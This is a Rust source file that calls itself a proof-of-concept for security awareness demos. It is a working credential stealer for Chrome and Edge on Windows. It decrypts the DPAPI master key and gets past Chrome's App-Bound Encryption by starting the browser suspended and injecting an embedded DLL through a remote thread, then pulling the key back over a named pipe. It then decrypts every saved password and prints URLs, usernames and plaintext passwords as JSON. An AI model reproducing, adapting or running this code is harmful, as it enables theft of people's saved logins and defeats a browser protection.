// PoC credential extractor for security awareness demos
// Targets Chrome + Edge saved passwords (v10/v11 DPAPI + v20 App-Bound Encryption)
// Uses DLL injection to bypass Chrome 127+ ABE caller validation

use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead, Nonce};
use base64::{Engine as _, engine::general_purpose::STANDARD as B64};
use serde::Serialize;
use std::path::PathBuf;
use std::{env, fs, ptr, mem, thread, time::Duration};
use windows::core::PCSTR;
use windows::Win32::Foundation::*;
use windows::Win32::Security::Cryptography::*;
use windows::Win32::Storage::FileSystem::*;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::LibraryLoader::*;
use windows::Win32::System::Memory::*;
use windows::Win32::System::Pipes::*;
use windows::Win32::System::Threading::*;

const DLL_BYTES: &[u8] = include_bytes!("../../abe_decrypt.dll");

#[derive(Serialize)]
struct Credential {
    browser: String,
    url: String,
    username: String,
    password: String,
    encrypted_version: String,
}

#[derive(Serialize)]
struct Output {
    success: bool,
    credentials: Vec<Credential>,
    errors: Vec<String>,
}

struct BrowserInfo {
    name: &'static str,
    local_state_path: PathBuf,
    login_data_path: PathBuf,
    exe_path: Option<PathBuf>,
}

fn get_browsers() -> Vec<BrowserInfo> {
    let local_app = env::var("LOCALAPPDATA").unwrap_or_default();
    let mut browsers = Vec::new();

    let chrome_dir = PathBuf::from(&local_app).join(r"Google\Chrome\User Data");
    if chrome_dir.exists() {
        browsers.push(BrowserInfo {
            name: "Chrome",
            local_state_path: chrome_dir.join("Local State"),
            login_data_path: chrome_dir.join(r"Default\Login Data"),
            exe_path: find_browser_exe("chrome"),
        });
    }

    let edge_dir = PathBuf::from(&local_app).join(r"Microsoft\Edge\User Data");
    if edge_dir.exists() {
        browsers.push(BrowserInfo {
            name: "Edge",
            local_state_path: edge_dir.join("Local State"),
            login_data_path: edge_dir.join(r"Default\Login Data"),
            exe_path: find_browser_exe("msedge"),
        });
    }

    browsers
}

fn find_browser_exe(name: &str) -> Option<PathBuf> {
    use windows::Win32::System::Registry::*;
    let subkey = format!(
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\{}.exe\0",
        name
    );

    unsafe {
        let mut hkey = HKEY::default();
        let res = RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            PCSTR::from_raw(subkey.as_ptr()),
            0,
            KEY_READ,
            &mut hkey,
        );
        if res.is_err() {
            return None;
        }

        let mut buf = [0u8; 512];
        let mut buf_len = buf.len() as u32;
        let res = RegQueryValueExA(
            hkey,
            PCSTR::null(),
            None,
            None,
            Some(buf.as_mut_ptr()),
            Some(&mut buf_len),
        );
        let _ = RegCloseKey(hkey);

        if res.is_err() || buf_len == 0 {
            return None;
        }

        let path_str = std::str::from_utf8(&buf[..buf_len as usize - 1]).ok()?;
        let p = PathBuf::from(path_str);
        if p.exists() { Some(p) } else { None }
    }
}

fn get_master_key(local_state_path: &PathBuf) -> Option<Vec<u8>> {
    let data = fs::read_to_string(local_state_path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&data).ok()?;
    let key_b64 = json["os_crypt"]["encrypted_key"].as_str()?;
    let key_raw = B64.decode(key_b64).ok()?;

    if key_raw.len() < 5 || &key_raw[..5] != b"DPAPI" {
        return None;
    }

    dpapi_decrypt(&key_raw[5..])
}

fn get_v20_encrypted_key(local_state_path: &PathBuf) -> Option<Vec<u8>> {
    let data = fs::read_to_string(local_state_path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&data).ok()?;
    let key_b64 = json["os_crypt"]["app_bound_encrypted_key"].as_str()?;
    let key_raw = B64.decode(key_b64).ok()?;

    if key_raw.len() < 4 || &key_raw[..4] != b"APPB" {
        return None;
    }

    Some(key_raw[4..].to_vec())
}

fn dpapi_decrypt(encrypted: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let input = CRYPT_INTEGER_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        let ok = CryptUnprotectData(
            &input,
            None,
            None,
            None,
            None,
            0,
            &mut output,
        );

        if ok.is_err() || output.pbData.is_null() {
            return None;
        }

        let result = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
        Some(result)
    }
}

fn rotl32(v: u32, n: u32) -> u32 {
    v.rotate_left(n)
}

fn pid_to_tag(pid: u32) -> String {
    let mut h = pid;
    h = rotl32(h ^ 0xA5A5A5A5, 7);
    h = rotl32(h ^ 0x3C6EF372, 13);
    h = rotl32(h ^ 0x1BF5A7E1, 17);
    h = rotl32(h ^ 0x9E3779B9, 23);
    format!("{:08X}", h)
}

fn decrypt_v20_key(exe_path: &PathBuf, encrypted_key: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let dll_path = env::temp_dir().join("abe_decrypt.dll");
        fs::write(&dll_path, DLL_BYTES).ok()?;
        let dll_path_cstr: Vec<u8> = dll_path.to_str()?
            .bytes().chain(std::iter::once(0)).collect();

        let exe_cstr: Vec<u8> = exe_path.to_str()?
            .bytes().chain(std::iter::once(0)).collect();
        let mut cmdline: Vec<u8> = format!(
            "\"{}\" --no-startup-window --headless\0",
            exe_path.to_str()?
        ).into_bytes();

        let mut si: STARTUPINFOA = mem::zeroed();
        si.cb = mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = mem::zeroed();

        let created = CreateProcessA(
            PCSTR::from_raw(exe_cstr.as_ptr()),
            windows::core::PSTR::from_raw(cmdline.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &si,
            &mut pi,
        );

        if created.is_err() {
            let _ = fs::remove_file(&dll_path);
            return None;
        }

        let h_process = pi.hProcess;
        let h_thread = pi.hThread;
        let pid = pi.dwProcessId;

        let tag = pid_to_tag(pid);
        let pipe_name = format!("\\\\.\\pipe\\{}\0", tag);

        let h_pipe = CreateNamedPipeA(
            PCSTR::from_raw(pipe_name.as_ptr()),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            1,
            4096,
            4096,
            10000,
            None,
        );

        if h_pipe.is_err() {
            let _ = TerminateProcess(h_process, 1);
            let _ = CloseHandle(h_thread);
            let _ = CloseHandle(h_process);
            let _ = fs::remove_file(&dll_path);
            return None;
        }

        let h_pipe = h_pipe.unwrap();

        let remote_buf = VirtualAllocEx(
            h_process,
            None,
            dll_path_cstr.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_buf.is_null() {
            let _ = CloseHandle(h_pipe);
            let _ = TerminateProcess(h_process, 1);
            let _ = CloseHandle(h_thread);
            let _ = CloseHandle(h_process);
            let _ = fs::remove_file(&dll_path);
            return None;
        }

        let mut written = 0usize;
        let _ = WriteProcessMemory(
            h_process,
            remote_buf,
            dll_path_cstr.as_ptr() as *const _,
            dll_path_cstr.len(),
            Some(&mut written),
        );

        let kernel32 = GetModuleHandleA(PCSTR::from_raw(b"kernel32.dll\0".as_ptr())).ok()?;
        let load_lib = GetProcAddress(kernel32, PCSTR::from_raw(b"LoadLibraryA\0".as_ptr()));
        let load_lib_addr = load_lib? as *const ();

        let _ = ResumeThread(h_thread);
        thread::sleep(Duration::from_millis(500));

        let h_remote = CreateRemoteThread(
            h_process,
            None,
            0,
            Some(mem::transmute::<
                *const (),
                unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
            >(load_lib_addr)),
            Some(remote_buf),
            0,
            None,
        );

        if h_remote.is_err() {
            let _ = CloseHandle(h_pipe);
            let _ = TerminateProcess(h_process, 1);
            let _ = CloseHandle(h_thread);
            let _ = CloseHandle(h_process);
            let _ = fs::remove_file(&dll_path);
            return None;
        }

        let h_remote = h_remote.unwrap();

        let _ = ConnectNamedPipe(h_pipe, None);

        let len_bytes = (encrypted_key.len() as u32).to_le_bytes();
        let mut bw = 0u32;
        let _ = WriteFile(h_pipe, Some(&len_bytes), Some(&mut bw), None);
        let _ = WriteFile(h_pipe, Some(encrypted_key), Some(&mut bw), None);

        let mut status_buf = [0u8; 4];
        let mut br = 0u32;
        let _ = ReadFile(h_pipe, Some(&mut status_buf), Some(&mut br), None);

        let result = if &status_buf[..2] == b"OK" {
            let mut len_buf = [0u8; 4];
            let _ = ReadFile(h_pipe, Some(&mut len_buf), Some(&mut br), None);
            let dec_len = u32::from_le_bytes(len_buf) as usize;
            let mut key_buf = vec![0u8; dec_len];
            let mut total = 0usize;
            while total < dec_len {
                let _ = ReadFile(
                    h_pipe,
                    Some(&mut key_buf[total..]),
                    Some(&mut br),
                    None,
                );
                total += br as usize;
                if br == 0 { break; }
            }
            Some(key_buf)
        } else {
            None
        };

        let _ = CloseHandle(h_pipe);
        let _ = CloseHandle(h_remote);
        let _ = TerminateProcess(h_process, 0);
        let _ = CloseHandle(h_thread);
        let _ = CloseHandle(h_process);
        let _ = fs::remove_file(&dll_path);

        if let Some(ref key_data) = result {
            if let Some(k) = dpapi_decrypt(key_data) {
                return Some(k);
            }
            if key_data.len() == 32 {
                return Some(key_data.clone());
            }
            None
        } else {
            None
        }
    }
}

fn decrypt_password(enc_pass: &[u8], dpapi_key: &[u8], v20_key: Option<&[u8]>) -> Option<String> {
    if enc_pass.len() < 4 {
        return None;
    }

    let prefix = &enc_pass[..3];

    if prefix == b"v20" {
        let v20 = v20_key?;
        if enc_pass.len() < 3 + 12 + 16 {
            return None;
        }
        let nonce = &enc_pass[3..15];
        let ciphertext = &enc_pass[15..];
        let cipher = Aes256Gcm::new_from_slice(v20).ok()?;
        let plaintext = cipher.decrypt(Nonce::from_slice(nonce), ciphertext).ok()?;
        String::from_utf8(plaintext).ok()
    } else if prefix == b"v10" || prefix == b"v11" {
        if enc_pass.len() < 3 + 12 + 16 {
            return None;
        }
        let nonce = &enc_pass[3..15];
        let ciphertext = &enc_pass[15..];
        let cipher = Aes256Gcm::new_from_slice(dpapi_key).ok()?;
        let plaintext = cipher.decrypt(Nonce::from_slice(nonce), ciphertext).ok()?;
        String::from_utf8(plaintext).ok()
    } else {
        dpapi_decrypt(enc_pass).and_then(|b| String::from_utf8(b).ok())
    }
}

fn extract_credentials(browser: &BrowserInfo, errors: &mut Vec<String>) -> Vec<Credential> {
    let mut creds = Vec::new();

    let dpapi_key = match get_master_key(&browser.local_state_path) {
        Some(k) => k,
        None => {
            errors.push(format!("{}: could not get DPAPI master key", browser.name));
            return creds;
        }
    };

    let v20_key = match get_v20_encrypted_key(&browser.local_state_path) {
        Some(enc_key) => {
            if let Some(ref exe) = browser.exe_path {
                match decrypt_v20_key(exe, &enc_key) {
                    Some(k) => Some(k),
                    None => {
                        errors.push(format!("{}: v20 DLL injection failed", browser.name));
                        None
                    }
                }
            } else {
                errors.push(format!("{}: browser exe not found for v20", browser.name));
                None
            }
        }
        None => None,
    };

    let tmp_db = env::temp_dir().join(format!("{}_LoginData.db", browser.name));
    if fs::copy(&browser.login_data_path, &tmp_db).is_err() {
        errors.push(format!("{}: could not copy Login Data", browser.name));
        return creds;
    }

    match rusqlite::Connection::open(&tmp_db) {
        Ok(conn) => {
            let mut stmt = match conn.prepare(
                "SELECT origin_url, username_value, password_value FROM logins"
            ) {
                Ok(s) => s,
                Err(e) => {
                    errors.push(format!("{}: SQL error: {}", browser.name, e));
                    let _ = fs::remove_file(&tmp_db);
                    return creds;
                }
            };

            let rows = stmt.query_map([], |row| {
                let url: String = row.get(0)?;
                let user: String = row.get(1)?;
                let pass: Vec<u8> = row.get(2)?;
                Ok((url, user, pass))
            });

            if let Ok(rows) = rows {
                for row in rows.flatten() {
                    let (url, username, enc_pass) = row;
                    if username.is_empty() && enc_pass.is_empty() {
                        continue;
                    }

                    let version = if enc_pass.len() >= 3 {
                        match &enc_pass[..3] {
                            b"v20" => "v20",
                            b"v10" => "v10",
                            b"v11" => "v11",
                            _ => "legacy",
                        }
                    } else {
                        "legacy"
                    };

                    let password = decrypt_password(
                        &enc_pass,
                        &dpapi_key,
                        v20_key.as_deref(),
                    ).unwrap_or_default();

                    creds.push(Credential {
                        browser: browser.name.to_string(),
                        url,
                        username,
                        password,
                        encrypted_version: version.to_string(),
                    });
                }
            }
        }
        Err(e) => {
            errors.push(format!("{}: could not open DB: {}", browser.name, e));
        }
    }

    let _ = fs::remove_file(&tmp_db);
    creds
}

fn main() {
    let browsers = get_browsers();
    let mut all_creds = Vec::new();
    let mut all_errors = Vec::new();

    for browser in &browsers {
        let creds = extract_credentials(browser, &mut all_errors);
        all_creds.extend(creds);
    }

    let output = Output {
        success: !all_creds.is_empty(),
        credentials: all_creds,
        errors: all_errors,
    };

    println!("{}", serde_json::to_string(&output).unwrap_or_default());
}
